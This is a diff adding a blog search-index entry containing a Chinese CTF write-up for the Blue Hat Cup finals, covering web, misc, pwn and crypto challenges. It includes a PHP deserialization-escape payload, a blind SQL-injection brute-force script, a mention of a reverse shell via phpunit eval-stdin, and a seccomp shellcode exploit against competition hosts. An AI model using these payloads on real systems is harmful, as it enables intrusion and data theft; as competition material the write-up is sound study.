+        <tag>搬家</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/01/01/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-%E7%88%86%E7%82%92%E8%85%B0%E8%8A%B1WP/</url>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>获取备份后发现有对序列化字符串的操作，经典的反序列化逃逸特征，</p>
+<p><img src="https://uploader.shimo.im/f/duta6sJ2QZsgKhoc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/ZlAsQqFLaUTNPj8f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>然后发现过滤的dir并不是数组中的dir，而是我们一开始传进去的get参数，构造payload如下</p>
+<p>?user=ohhhh&amp;pass=a3333&amp;repass=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin%22;s:3:%22dir%22;s:5:%22/flag%22;}&amp;dir=pcyq23333</p>
+<p>flag：</p>
+<p><img src="https://uploader.shimo.im/f/UHRlnBcNY2vJ14rw.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="login："><a href="#login：" class="headerlink" title="login："></a>login：</h2><p>根据题目给的提示可以知道是phpunit框架，然后根据已知的漏洞可以在/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php中执行post进去的内容，但是本题ban掉了很多函数，然后php反弹shell也没有维持成功，利用python的反弹shell方式可以成功</p>
+<p><img src="https://uploader.shimo.im/f/eo7r1gO1TXCFe0wQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>尝试直接用python的命令执行读取flag，发现权限不够，所以要想办法提权。</p>
+<p>然后因为本题目使用的是默认的DVWA框架，所以可以通过读取/config/config.inc.php文件来获取用户名和密码</p>
+<p><img src="https://uploader.shimo.im/f/HOqWLEql7OubweXc.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>最后利用python实现命令行交互，获得admin权限后就可以获取flag</p>
+<p>flag：</p>
+<p><img src="https://uploader.shimo.im/f/hkIUEVUhIZqfdC2J.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>BJDCTF2020的原题，改下脚本就行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">def ord2hex(string):</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">for i in string:</span><br><span class="line">result +&#x3D; hex(ord(i))</span><br><span class="line">result &#x3D; result.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">return &#39;0x&#39;+result</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zeh6dgtru4egt90l2sv.cloudeci1.ichunqiu.com:80&#x2F;index.php&quot;</span><br><span class="line">string &#x3D; [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;]</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.2; rv:16.0) Gecko&#x2F;20100101 Firefox&#x2F;16.0&#39;,</span><br><span class="line">&#39;Accept&#39;:&#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">&#39;Connection&#39;:&#39;keep-alive&#39;</span><br><span class="line">&#125;</span><br><span class="line">res &#x3D; &#39;&#39;</span><br><span class="line">for i in range(50):</span><br><span class="line">for j in string:</span><br><span class="line">passwd &#x3D; ord2hex(&#39;^&#39;+res+chr(j))</span><br><span class="line"># print(passwd)</span><br><span class="line">passwd &#x3D; &#39;or&#x2F;**&#x2F;password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;&#123;&#125;#&#39;.format(passwd)</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">&#39;username&#39;:&quot;admin\\&quot;,</span><br><span class="line">&#39;password&#39;:passwd</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; req.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line"># print(r.text)</span><br><span class="line">if &quot;账号或密码错误！&quot; not in r.text:</span><br><span class="line">res +&#x3D; chr(j)</span><br><span class="line">print(res)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>
+<p>flag：</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://uploader.shimo.im/f/2SiGWdWJFCTI96Mu.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></h1><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>转assii</p>
+<h2 id="MISC隐写"><a href="#MISC隐写" class="headerlink" title="MISC隐写"></a>MISC隐写</h2><p>用binwalk提取图片内容，提取出一个PDF和加密压缩</p>
+<p>PDF用wb4stego解密</p>
+<p>得到</p>
+<p><img src="https://uploader.shimo.im/f/7IHf4GXAOcu0OqMT.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>没解出来，但是爆破压缩包密码，得到了rmrf，keyword cipher解密</p>
+<p><img src="https://uploader.shimo.im/f/KnDYWnfMZHu2zy3i.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/a0HB2S2YipjFqu5X.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h2 id="QAQ-pcap"><a href="#QAQ-pcap" class="headerlink" title="QAQ_pcap"></a>QAQ_pcap</h2><p>在65流里找到了TLS的log，可以对TLS流量进行解密</p>
+<p><img src="https://uploader.shimo.im/f/VSOPM5cga2hhsSvQ.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>解密后可以提取出一个rar文件</p>
+<p>解压得到so_easy.pcap,文件头被改了，改回来</p>
+<p><img src="https://uploader.shimo.im/f/257jpnnKT6KuRkyr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>对流量包进行分析，发现是多个usb设备的流量，将每个单独过滤保存。</p>
+<p><img src="https://uploader.shimo.im/f/LoZCigS5VbJxhYTo.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>单独分析，有一个鼠标流量，一个键盘流量，鼠标画出来啥都不是</p>
+<p>流量键盘用脚本进行解析</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mappings &#x3D; &#123; 0x04:&quot;A&quot;,  0x05:&quot;B&quot;,  0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;,  0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;,  0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;,  0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;,  0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\n&quot;, 0x2a:&quot;[DEL]&quot;,  0X2B:&quot;    &quot;, 0x2C:&quot; &quot;,  0x2D:&quot;-&quot;, 0x2E:&quot;&#x3D;&quot;, 0x2F:&quot;[&quot;,  0x30:&quot;]&quot;,  0x31:&quot;\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;,  0x34:&quot;&#39;&quot;, 0x36:&quot;,&quot;,  0x37:&quot;.&quot; ,225:&quot;[LeftShift]&quot;,229:&quot;[RightShift]&quot;,0x50:&quot;[LeftArrow1]&quot;&#125;</span><br><span class="line">nums &#x3D; []</span><br><span class="line">keys &#x3D; open(&#39;key.txt&#39;)</span><br><span class="line">for line in keys:</span><br><span class="line">	if(len(line)) !&#x3D; 17:</span><br><span class="line">		continue</span><br><span class="line">	print(line[4:6])</span><br><span class="line">	nums.append(int(line[4:6],16))</span><br><span class="line">keys.close()</span><br><span class="line">print(nums)</span><br><span class="line">output &#x3D; &quot;&quot;</span><br><span class="line">for n in nums:</span><br><span class="line">	if n &#x3D;&#x3D; 0 :</span><br><span class="line">		continue</span><br><span class="line">	if n in mappings:</span><br><span class="line">		output +&#x3D; mappings[n]</span><br><span class="line">	else:</span><br><span class="line">		output +&#x3D; &quot;[&quot;+str(n)+&quot;]&quot;</span><br><span class="line">print(&#39;output :\n&#39; + output)</span><br></pre></td></tr></table></figure>
+<p>注意有LeftArrow1和shfit,都解释出来后就得到flag了<br>flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi!This is y flag!</span><br><span class="line">The flag[] is flag&#123;Pc@p_1s_5o_3asY!&#125;</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p><img src="https://uploader.shimo.im/f/uRxLkDcplO5aDJ3f.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>Seccomp沙箱，有open read函数没有write写函数</p>
+<p>基本思路是构造爆破（之前打过一个比赛跟这个思路差不多都是构造shellcode比较爆破）</p>
+<p>open后read，使用cmp比较，等于则使用jz进行死循环，否则ret退出</p>
+<p><img src="https://uploader.shimo.im/f/dz5I2at61EGCT5kK.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<p>完整exp如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;chall&#39;)</span><br><span class="line">EXCV &#x3D; context.binary &#x3D; &#39;.&#x2F;chall&#39;</span><br><span class="line">#libc&#x3D;(&#39;&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"> </span><br><span class="line">def pwn(p, idx, c):</span><br><span class="line">    # open</span><br><span class="line">    shellcode &#x3D; &quot;push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;&quot;</span><br><span class="line"> </span><br><span class="line">    # re open, rax &#x3D;&gt; 4</span><br><span class="line">    shellcode +&#x3D; &quot;push 2; pop rax; syscall;&quot;</span><br><span class="line"> </span><br><span class="line">    # read(rax, 0x10040, 0x50)</span><br><span class="line">    shellcode +&#x3D; &quot;mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;&quot;</span><br><span class="line">    </span><br><span class="line">    # cmp and jz</span><br><span class="line">    if idx &#x3D;&#x3D; 0:</span><br><span class="line">        shellcode +&#x3D; &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(idx, c)</span><br><span class="line">    else:</span><br><span class="line">        shellcode +&#x3D; &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(idx, c)</span><br><span class="line"> </span><br><span class="line">    shellcode &#x3D; asm(shellcode)</span><br><span class="line"> </span><br><span class="line">    p.sendafter(&quot;xecution-box.\n&quot;, shellcode.ljust(0x40-14, b&#39;a&#39;) + b&#39;&#x2F;home&#x2F;pwn&#x2F;flag&#39;)</span><br><span class="line"> </span><br><span class="line">idx &#x3D; 0</span><br><span class="line">var_list &#x3D; []</span><br><span class="line">while(1):</span><br><span class="line">    for c in range(32, 127):</span><br><span class="line">        p &#x3D; remote(&quot;8.131.246.36&quot;,40334)#nc 8.131.246.36 40334    </span><br><span class="line">        pwn(p, idx, c)</span><br><span class="line">        start &#x3D; time.time()</span><br><span class="line">        try:</span><br><span class="line">            p.recv(timeout&#x3D;2)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        end &#x3D; time.time()</span><br><span class="line">        p.close()</span><br><span class="line">        if end-start &gt; 1.5:</span><br><span class="line">            var_list.append(c)</span><br><span class="line">            print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br><span class="line">        break</span><br><span class="line">    idx &#x3D; idx + 1</span><br><span class="line"> </span><br><span class="line">print(&quot;&quot;.join([chr(i) for i in var_list]))</span><br></pre></td></tr></table></figure>
+<p>经过多次失败的爆破后<br>终于有了一个完整的</p>
+<p><img src="https://uploader.shimo.im/f/UKIa2isXiV4pTpyX.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="common-modulus"><a href="#common-modulus" class="headerlink" title="common_modulus"></a>common_modulus</h2><p>先用共模，算出HINT</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 共模攻击</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii as B</span><br><span class="line">n &#x3D; 781036391323974008856551441504551844841173384369055361767143425092387727015642055181741701170017399241497120632344953499820518820132068694764700867696829033106666055030180813062993649803797649124562825632340854157269454042167398954816966758408050707394510052574354703514670567409229754892812751190528559839163370996270173354192391025119212070374345175232268160015709412770236244184407603397493657886160301984598114022346065772036916080039069065703045460825584095559014098364274915486192890077441915702648662247422573607141301387160468708901332801070000950051880674436952646199048944681743156311156561347137284309444428161898926050856612636204505753959646608899803680618195914959490447723147711810217755931778569656715879355497741337867486596084617334222360877256151925248867366886699774397369843538784086757551124956184373578870266105742924242667575610284091444010308038579594247922368368398449676635147254244680714381600463229849534333608407292776731721661271718860696451810720187133868564530559847589151122364073467586981976649022363672800597675920485113168688814933825793827901051904388778126030212255351752567066602576348655685594872269975311829268026394327948942096118152848379484736487085060738082253125862183108996724624059293</span><br><span class="line">c1 &#x3D; 369574840235539108372094092254419274246554984982221252273253594183836400022960378170488757871945636102709146100003103420983393418895920944769809509498534206740321414394214836818668536994868508542980403916810808297197199669370712797146359430162012897117686984913530312098913792383741034334686281360853026726954824577914039860820382688425141138202072956110821496285690037742234810972548140439615644523558778763893381916419169521655893103187028705326557465586164413430726626576639348603638806511311706975958593200898505048876740706947195874397909272772688774998312506679360257618176951770041342256209410863260884750487279961933541672586237719402972217492287549068766414410155714303648473676009661943965293501994978200745219593293552499364219563185093112256120550663818918964081980469288619926291250638450874316053326601032273087039376723415701554676257043515877013761681843885375325430297941942692679848107999743068109805325264735576658206199089491608087442001508062053843516431089207243339447049547611183815785864081653492970812961076181422434762137310522146572918571492263273382927468586853431581811297567337244729976259333642991615934568219783998183005087012034016783535060297367475598352120058322912068079704771685886066199702963018</span><br><span class="line">c2 &#x3D; 401003748149510002818767369230254602513865159661339906800347290711690807270702301230624025422831311596632795141531720435002853738573163182312453127686259756779068482529257900103967550779067445990067902733048774414790636519587265122992946230937925359967091172504901407334687520803755214564929157748817222608867504984640435317237940989728715980606596332309938083583162432506373976839198105889860716728175207628676903581344807944755695848151190623498753010294323617338270060040423742010145259129678264662465355879341730120526032229944482388360258216424682694404263498956947130580056839592840962191604893632645585505577517647817952448510353267629549246776809657021963707309740084072731429860522801140021375078140454523473108229522456529438036963702296406101462856177037427008765522302625128434931680973911239443952409966616788095217782552153170772137807287594897681855045237814736536800205438589010668545647972935172419082314572196606656703628418159952436419223060565888253991481370307426542468001783829259332035534414470988788183383528642038979811899061182916422795902465788443785184461640800074642736248613386467596765647696764766509793194318458994279346191732415463226129676210488158303216826287374744132977258018064709541279591219801</span><br><span class="line">e1 &#x3D; 321959</span><br><span class="line">e2 &#x3D; 250261</span><br><span class="line">s0, s1, s2 &#x3D; gmpy2.gcdext(e1, e2)</span><br><span class="line">if s1 &lt; 0:</span><br><span class="line">    s1 &#x3D; -s1</span><br><span class="line">    c1 &#x3D; gmpy2.invert(c1, n)</span><br><span class="line">elif s2 &lt; 0:</span><br><span class="line">    s2 &#x3D; -s2</span><br><span class="line">    c2 &#x3D; gmpy2.invert(c2, n)</span><br><span class="line">m &#x3D; gmpy2.powmod(c1, s1, n)*gmpy2.powmod(c2, s2, n) % n</span><br><span class="line">m &#x3D; gmpy2.iroot(m,11)[0]</span><br><span class="line">print(&#39;[-]m is:&#39;, m)</span><br><span class="line">print(hex(m))</span><br><span class="line">print( B.a2b_hex(hex(m)[2:]))</span><br></pre></td></tr></table></figure>
+<p><img src="https://uploader.shimo.im/f/8JFCib49NLzjrsj3.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">hint &#x3D; 0x65333d3338363332312c65343d323136343337</span><br><span class="line"></span><br><span class="line">n2 &#x3D; 829153922415855137264800234822397159517330834702889033537933377293887344320377111020468975059392957737449202237724182178497515850669969287557171761512943313347002707881627665997773538338624697031113180118787578098839812766590356161880633390491240275263405375614880514319024910802488825931065452764114707860207310201420715597319258880485040522551832971592910421789656655281398336391483665797851843030704262677198876702546809063670714197016598069553974073602743894202215033991282795559558580509644985355582265309273819085165244990507821708921430055578522701525123887916901778357465509369586730929688392667732886906857430517653096398002777964560127268121571049233223372798710275104635615146227690965482270801899538594859206469480776522613028131598888508457709453379574742196454867003503347438618445660900423827776062276496733498823286497376761412579384984369308185260156963156405659950843672893896087650002269874800953868406307954077672988900057904666430054296760155287271561170025767624003816826720442668295925485637633877652749338842612472516105683964067019360513619412986301224461318521372012905629559424109846511589009550745828509068711532135188012958609344134355466641890243263881890822508445307982892951553198862583429368670057993</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c3 &#x3D; 159724515943626607063077852180725785535830882720862727668525327462548399711146109134244815376287134761817075519820142556357574606798840233562248755971526219627762223734393473798914901143269449212790392600105330383090174083139586064181174009077350924651070244802047181675971743583126005374180803661344948105563731243622231745397860438110568700027808240466520775159603948893458839584686022713865445974999010633338992077036339635470928309825709158252021736998333181626196852117911063143924690274341118934263954401171980866857766803251097624531349328131906037324939822709718110584612723905396082816423636920021116198893529151233844741049768382997165306708386377461537659894631638669541135139772256724755879894163220385702448163577861050255922091076291360733371557008202704744025308442559929057280944151904346146363641694256384699833066941693911888313063101709464779564216471784300409758667075242519216711038178970244130709075948085377075896223268673956328949049096893114349123857314470200317354442002350914580896785644057370606138149403529271049952702755513806243257608741081761103014849775297798769123025294190124352059867893341310583345698551198662911063194743695473937982189580136904500546179872911907699655901666991491654421172959264</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c4 &#x3D; 577539997913679548128771306860581210544436789252901226997329423745523775309125445697836728285902404228772238261978792894724035857571722732772392975266650638941506233731097966088599219553016910895407298319171601788682316820727521975802034842881641332176636880671926669677709251368489592049188264858974171362799051918792714121517422464840766220636795897542591062529334135365684855298036787805819982776703613397951208027499626161971540340384357517350954755917853981444696889490414620688922414306470663625107920255478295871212500731262906706677230231273773081082937699900897018507666959617262265778895830665231960626623936539619558323350031200046331865204833002387826480300556398975518044660453862186191885052104669182124205562629260585502282489936369132703221625792917684714281278526690498041768698231671538540231217204457920089132127615505206718241082416584911313565380784068494321438301994932115301961956898936006101799945175006847294491423172988371831199816110394796146842726192613950900507852084712888550397657990358471172662866403096061418272111461743199683739447289005311734544421847876133462236161463005728810728422873087670552019575195179400831748068699257581271088746550021722434317091260496556373742562805426688588980981788900</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c &#x3D;795129169552291006861754002206513820937641980698434382418936261423422746999612445764303059674219208389574024534672717069821412414159146551366545996353949783196010213553918927580779995019174186191032145333149188913037471190229239099846321485033232436935611571367541493044277081533408993875257311753734536147571167095896669077719414131452331046090464837590749820091009158875152457888900355791540044943189887475311977641143538035689663891597983971260327156044023687896426055728061855343985242964248584312808777178962375936043822201018415653235814485615205327407400780005852561278683155208683364942051067379779866515199199129202240010485952950728372189222715041921342651574061028219342292107006496306690996248232154011982638406599183117999624463176008864712361084026607499225962202418264921259296412132569498420948156231991422121967643470934361208982842203404876002586976855763264989245461870293707215153833855463524713435447265274151395156396029507394842810440848947409747692940663271981830686236597905086310965497295634452454502792579750856566644956428398186959955662345052899355866818276388556869309837579415317436154415391396745002015389421807844666877314560257175276506064197678141334956984552068148598923249237123558477833149102400</span><br><span class="line">e3&#x3D;386321</span><br><span class="line">e4&#x3D;216437</span><br><span class="line">s0, s1, s2 &#x3D; gmpy2.gcdext(e3, e4)</span><br><span class="line">if s1&lt;0:</span><br><span class="line">	s1 &#x3D; - s1</span><br><span class="line">	c3 &#x3D; gmpy2.invert(c3, n2)</span><br><span class="line">elif s2&lt;0:</span><br><span class="line">	s2 &#x3D; - s2</span><br><span class="line">	c4 &#x3D; gmpy2.invert(c4, n2)</span><br><span class="line">	c &#x3D; pow(c3,s1,n2)*pow(c4,s2,n2) % n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a &#x3D; gmpy2.invert(hint**13,n2)</span><br><span class="line">d &#x3D; (c*a)%n2</span><br><span class="line">flag &#x3D; gmpy2.iroot(d,13)[0]</span><br><span class="line">print long_to_bytes(flag)</span><br></pre></td></tr></table></figure>
+<p><img src="https://uploader.shimo.im/f/eds6YkgkgyutXsUr.png!thumbnail?fileGuid=xXTRKk6tD9QxwqwC" alt="图片"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1>]]></content>
   </entry>
 </search>
